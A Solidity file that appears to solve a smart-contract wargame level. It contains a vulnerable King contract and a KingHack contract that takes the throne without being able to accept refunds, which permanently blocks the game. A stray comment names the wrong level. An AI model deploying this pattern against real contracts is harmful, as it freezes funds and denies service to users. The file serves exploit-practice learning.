// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

// goal: make Force contract receive any money

// an original contract
// deploy it sending some money first
contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() payable {
    owner = payable (msg.sender);  
    king = payable (msg.sender);
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = payable (msg.sender);
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}

// a contract that hacks the original one
// deploy it second
contract KingHack {
    // use this function with deployed King address as an argument
    // and send value >= current prize in King
    function hack(address payable _king) external payable {
        (bool success, ) = _king.call{value: address (this).balance}("");
        require(success);
    }
}

contract AdditionalInformation {
    function getCurrentPrize(address payable _kingAddress) external view returns (uint) {
        return King (_kingAddress).prize();
    }

    function getBalance(address _address) external view returns (uint){
        return _address.balance;
    }
}